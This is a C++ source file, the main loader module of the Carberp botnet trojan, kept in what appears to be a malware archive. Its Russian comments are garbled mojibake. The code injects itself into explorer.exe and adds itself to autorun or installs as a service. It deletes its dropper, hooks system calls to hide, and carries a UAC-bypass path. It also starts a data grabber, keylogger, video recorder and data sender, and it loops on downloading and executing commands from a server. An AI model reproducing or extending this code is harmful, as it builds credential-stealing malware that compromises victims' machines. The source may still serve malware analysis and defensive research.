/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include <windows.h>

#include "BotCore.h"
#include "DllLoader.h"

#include "Utils.h"
#include "Exploit.h"
#include "BotUtils.h"
#include "Rootkit.h"
#include "Inject.h"
#include "Unhook.h"
#include "Loader.h"
#include "Config.h"
#include "Crypt.h"
#include "FtpSniffer.h"
#include "ntdll.h"
#include "BotEvents.h"
#include "Task.h"
#include "md5.h"
#include "BotDef.h"
#include "DbgRpt.h"
#include "Modules.h"
#include "Main.h"
#include "StrConsts.h"
#include "Installer.h"



#include "BotDebug.h"

//********************** ���������� ������� **********************************

namespace MAINDBGTEMPLATES
{
	#include "DbgTemplates.h"
}

// ��������� ������ ������ ���������� �����
#define MDBG MAINDBGTEMPLATES::DBGOutMessage<>


//***************************************************************************




/*char* LogName = "c:\\BotLog.log";

void WriteLog(const char* Msg)
{
	HANDLE H = (HANDLE)pCreateFileA(LogName, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, 0,NULL);
	pSetFilePointer(H, 0, 0, FILE_END);
	DWORD W;
	string L;
	L.Format("[%d] %s \r\n", (DWORD)pGetTickCount() / 1000, Msg);
	pWriteFile(H, L.t_str(), L.Length(), &W, NULL);

//	pWriteFile(H, Msg, strlen(Msg), &W, NULL);
//	pWriteFile(H, "\r\n", 2, &W, NULL);
	pCloseHandle(H);
}
*/






#pragma comment(linker, "/ENTRY:MyMain" )
//#pragma comment(linker, "/ENTRY:ExplorerMain" )


char DropperFileName[MAX_PATH]; // ��� ������������ �����

//WCHAR TempFileName[ MAX_PATH ]; //���� ���� ��� ���������� � ������������
//WCHAR FileToDelete[ MAX_PATH ]; //���� ��� �������� ��������������� ����� ����

DWORD DropperPid     = 0; // ��� �������� ����
BOOL IsDropper       = 0; // ������� ����, ��� ��� �������� ������ �� �������
BOOL FirstRun	     = 0; //������� ���� ��� ��� ����������� ����� ���
DWORD dwAlreadyRun   = 0; //���� ��� ��������
DWORD dwGrabberRun	 = 0; //��������� �� �������
BOOL InjectedInSelfExplorer = 0; //������� ����, ��� ����� ��� ������ ���� ��������� ���������� ���� �� � ������������
//DWORD dwExplorerPid  = 0; //��� ����������



void InternalAddToAutorun()
{
	// ��������� ��������� � ������������
	// ������ � ������ ���� � ������� �� ��������������� �������
	// ��������������� �� �������� ��������� �������
	#ifdef DEBUGBOT
		return;
	#endif
	
	const static char ButkitMutex[] = {'b', 'k', 't', 'r', 'u', 'e',  0};
	HANDLE Mutex = (HANDLE)pOpenMutexA(SYNCHRONIZE, TRUE, (PCHAR)ButkitMutex);
	if (Mutex)
	{
		pCloseHandle(Mutex);
		MDBG("Main", "������ ����������. ���������� ���������� � ������������.");
		return;
	}

	bool ServiceInstalled = false;
	//if (!WSTR::IsEmpty(TempFileName))
	if (IsDropper)
	{
			Install(DropperFileName, FALSE,  TRUE, DropperPid);
	}
}


void DeleteDropper() // ������� �������, ������� ����
{
	
	if (IsDropper)
	{
		MDBG("Main", "������� ������");
		pWinStationTerminateProcess(NULL, DropperPid, DBG_TERMINATE_PROCESS );	
		pSetFileAttributesA( DropperFileName, FILE_ATTRIBUTE_ARCHIVE );
		pDeleteFileA(DropperFileName);
	}
}



BOOL RunLoaderRoutine()
{
#ifdef UAC_bypassH
//	if( !RunBotBypassUAC(0) )
		return MegaJump( LoaderRoutine ) == TRUE;
//	return true;
#else
	return MegaJump( LoaderRoutine );
#endif
}

BOOL RunVideoProcess()
{
	#ifdef VideoRecorderH
		MDBG( "Main", "������ �������� � ��������� ��������" );
		return MegaJump( VideoProcess::StartSvchost );
	#else
		return FALSE;
	#endif
}

DWORD WINAPI LoaderRoutine( LPVOID lpData )
{
	BOT::Initialize();
	
	MDBG("Main", "*************** LoaderRoutine (PID:%d)", GetUniquePID());

	//UnhookDlls();

	BOT::Protect(NULL);

	// ��������� ����������� ������ ��� ����� ��������
	DisableShowFatalErrorDialog();

	// �������������� ������� �������� �������������� ����������
	DebugReportInit();

	// �������� �������
	bool Cancel = false;
	SVChostStart(NULL, Cancel);
	if (Cancel)
	{
		// ������� ������� svchost
		pExitProcess(1);
	}

	// ��������� ��������������
	#ifdef BotAutoUpdateH
		StartAutoUpdate();
	#endif

	// �������� ����� �������� ������

	DataGrabber::StartDataSender();

	// �������� ����� ���������� ������ ��������� ���������
	#ifdef UniversalKeyLoggerH
		KeyLogger::StartProcessListDownloader();
	#endif


	bool FirstSended = false;

	#ifdef VideoRecorderH
		#ifndef VideoProcessSvchost
			if( VideoProcess::Start() )
				MDBG( "Main", "��������� ����� �������" );
			else
				MDBG( "Main", "ERROR: �� ���������� ����� �������" ); 
		#endif //VideoProcessSvchost
	#endif

	if (InitializeTaskManager(NULL, true))
	{
		MDBG("Main", "=====>> �������� ���������� ������");

		while (true)
		{

			DownloadAndExecuteCommand(NULL, NULL);

			// "������������" �������������� ����������� ���� � ��� �������
			// �������� ��������� ���������� ������ ���� ������ ����� ���������
			// �������
			if (!FirstSended)
			{
				MDBG("Main", "=====>> ���������� ���������� � �������");
				FirstSended = SendFirstInfo();
			}

			// ���������������� ���������� ������
			if (!TaskManagerSleep(NULL))
				break;
		}

    }
	pExitProcess(0);
	return 0;
}

void ExplorerMain()
{
	BOT::Initialize();

	MDBG("Main", "----------------- ExplorerMain -----------------");
	MDBG("Main", "Appliation (PID:%d) %s", Bot->PID(), Bot->ApplicationName().t_str());
	MDBG("Main", "WorkPath %s", BOT::GetWorkPath());

	// ������� ������� ����������� ���� ��� ������������ ������ 
	// �������� �����������.
	BOT::TryCreateBotInstance();

	if (!InjectedInSelfExplorer)
		UnhookDlls();

	// ��������� ����������� ������ ��� ����� ��������
	//DisableShowFatalErrorDialog();

	InternalAddToAutorun();

	DeleteDropper();


	//----------------------------------------------------

	if ( !dwAlreadyRun )
	{
		RunLoaderRoutine();
		//MegaJump( LoaderRoutine );
		//RunBotBypassUAC(0);
	}
	#ifdef VideoProcessSvchost
		RunVideoProcess();
	#endif

	#ifdef GrabberH
		if (FirstRun && !dwGrabberRun )
			MegaJump( GrabberThread ); 
	#endif

	//MegaJump(AvFuckThread);
	
	// 
	HookZwResumeThread();
	HookZwQueryDirectoryFile();


	// �������� ������� c����� ����������

	if (FirstRun)
		ExplorerFirstStart(NULL);

	ExplorerStart(NULL);
	// ������ � ����������� ���� ������ 
	while (1) pSleep(INFINITE);
}


DWORD WINAPI ExplorerRoutine( LPVOID lpData )
{

	BOT::InitializeApi();

	MDBG( "Main", "ExplorerRoutine InjectedInSelfExplorer=%d",  InjectedInSelfExplorer);
	
	if (InjectedInSelfExplorer) 
	{
		//���� ������ ��� � ���� ��������� �����������	
		InjectedInSelfExplorer = FALSE;
		if (!InjectIntoExplorer(ExplorerRoutine))
		{
			ExplorerMain();
		}

		pExitProcess(1);
	}
	ExplorerMain();
	return 0;
}

/*
DWORD WINAPI RunFromDll(void*)
{
	BOT::Initialize();
	DWORD pid = GetUniquePID();
	MDBG( "DllBot", "��������� �� dll pid=%d", pid );
	pWinExec( "regedit.exe", SW_SHOW );
	int err = pGetLastError();
	while(1)
	{
		Sleep(5000);
		MDBG( "DllBot", "work %d,%d", pid, err );
	}
	return 0;
}
*/

int APIENTRY MyMain() 
{
	BOT::Initialize();   
#ifdef UAC_bypassH
	DWORD image = (DWORD)GetImageBase();
    PIMAGE_NT_HEADERS headers = (PIMAGE_NT_HEADERS)
        ((PUCHAR)image + ((PIMAGE_DOS_HEADER)image)->e_lfanew);
	if( headers->FileHeader.Characteristics & IMAGE_FILE_DLL )
	{
		//exe ���� ������� ��� dll, ����� ����� ���� ��� ������ ��������� �����
		MDBG( "Main", "��������� ��� DLL ����� ������ UAC" );
		if( ExecTaskAfterUAC() )
			return 0;
	}
#endif //UAC_bypassH

	MDBG("Main", "����������� ���. ������ ���� %s\r\nEXE: %s", BOT_VERSION, Bot->ApplicationName().t_str());
	
#ifdef INSTALL_BOT_AS_SERVICE
	// ��������� ������ ������� ��� ���
	if (BOT::IsService())
	{
		MDBG("Main", "�������� ������");
		MDBG("Main", "������� ������� %s", BOT::GetBotPath().t_str());
		// ���� ��� ��� ��  �������, �� ��������� ������ � ���������
		BOT::SetBotType(BotService);

		if (!BOT::IsRunning())
		{
			//JmpToExplorer(ExplorerRoutine);
			MDBG("Main", "������ ���������� � Explorer");
			dwExplorerSelf = 1;
			JmpToExplorer(ExplorerRoutine);
		}

		BOT::ExecuteService();
		pExitProcess(0);
		return 0;
	}
#endif

	MDBG("Main", "����������� Ring3 ������ ����");
	// ����������� ����3 ������
	BOT::SetBotType(BotRing3);

	// ��������� �� ������� �� �� ������ ���������� ������ ��������� ����
	if (BOT::IsRunning())
	{
		pExitProcess(0);
		return 0;
	}

	MDBG("Main", "����������� ���. ������ ���� %s", BOT_VERSION);


	//UnhookDlls(); //������� ����

	pGetModuleFileNameA(NULL, DropperFileName, MAX_PATH);
	DropperPid = (DWORD)pGetCurrentProcessId();

	DWORD dwProcessHash = File::GetNameHashA(DropperFileName, false);
	DWORD dwProcessHash2 = File::GetNameHashA(DropperFileName, true);
	
	
	// ��������� �������� ������� (������� ���� ��� �� ������������)
	IsDropper = dwProcessHash != BOT::GetBotExeNameHash();

	// ���� ������ ��� �� ������� �� �������, ��� ��� ������ ������
	FirstRun = IsDropper;

	// ��������� �������� �� �� � �������� ����������
	bool InExplorer = dwProcessHash2 == 0x490A0972 /* explorer.exe */; 

	// ������� �������
	KillOutpost();

	// ������������� ���������
	BOOL Exploits = SetExploits();

	if (!Exploits)
	{
		// ���� �� ����������������� ��������� �� ��������� ������� ������� ��� ���������
		// �, � ������ �������  �������, ��������� ������ �������

		if ( RunLoaderRoutine() /*MegaJump( LoaderRoutine )*/ )
			dwAlreadyRun = 1;

		#ifdef GrabberH
			if (FirstRun)
				dwGrabberRun = MegaJump(GrabberThread);
		#endif 
	}


	if (InExplorer)
	{
		MDBG( "Main", "���������� � �������� explorer.exe");
		IsDropper = FALSE;
		InjectedInSelfExplorer = FALSE;
		RunThread( ExplorerRoutine, 0 );
	}
	else
	{
		// ������� ������ exe ����
		MDBG( "Main", "� �������� [IsDropper=%d] %s, %08x", IsDropper, DropperFileName, dwProcessHash2 );
		InjectedInSelfExplorer = TRUE;
	    // ��������� ���� ��������� � ���������� � ����
		if (!JmpToExplorer(ExplorerRoutine))
		{
			MDBG( "Main", "������ �������� ���������� � ������� � ����");
			InjectedInSelfExplorer = FALSE;
			
			if (IsDropper)
				InternalAddToAutorun();

			// �������� ������������� � ���������� ���������
			if (!InjectIntoExplorer( ExplorerRoutine ) && !dwAlreadyRun )
			{
				RunLoaderRoutine(); //MegaJump( LoaderRoutine );
			}
		}
	}

/*
	m_wcsncpy(FileToDelete, ModulePath, m_wcslen( ModulePath ) );
	dwKillPid = (DWORD)pGetCurrentProcessId();
	CopyFileToTemp( ModulePath, TempFileName );

	if (!IsDropper) 
	{
		// ������ �� ���� � ������������

		if ( !JmpToExplorer( ExplorerRoutine ) )
		{
			InjectedInSelfExplorer = FALSE;

		}		
	}
	else
	{
		// ��� ����������� �� �������

		InjectedInSelfExplorer = TRUE;

		if(InExplorer)
		{
		}
		else
		{

			if (!JmpToExplorer(ExplorerRoutine ) )
			{
				InjectedInSelfExplorer = 0;
	
			}
		}
	}
*/

	if(!InExplorer) 
		pExitProcess(1);
	return 1;
}